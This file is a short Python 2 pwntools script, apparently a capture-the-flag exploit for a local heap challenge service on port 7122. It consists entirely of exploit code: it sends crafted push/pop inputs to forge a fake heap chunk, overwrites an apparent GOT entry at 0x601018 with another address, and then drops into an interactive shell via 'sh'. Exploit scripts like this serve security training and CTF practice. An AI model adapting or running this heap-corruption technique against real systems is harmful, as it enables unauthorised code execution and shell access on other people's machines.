#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'
p = remote('127.0.0.1', 7122)

def push(c, sz, s):
	p.sendline(c)
	p.sendline(str(sz))
	p.send(s)
	sleep(0.2)

def pop(c):
	p.send(c)
	sleep(0.2)


push('push', 65, 'asdf\n')
pop('pop\n')
pop('pop'.ljust(8)+flat(0, 0x71, 0, 0x601110).rjust(120))
p.sendline('')
push('push', 104, 'A'*96+p64(0x601018))
p.sendline('')
p.sendline('sh\x00'.ljust(8)+p64(0x400846))
p.interactive()
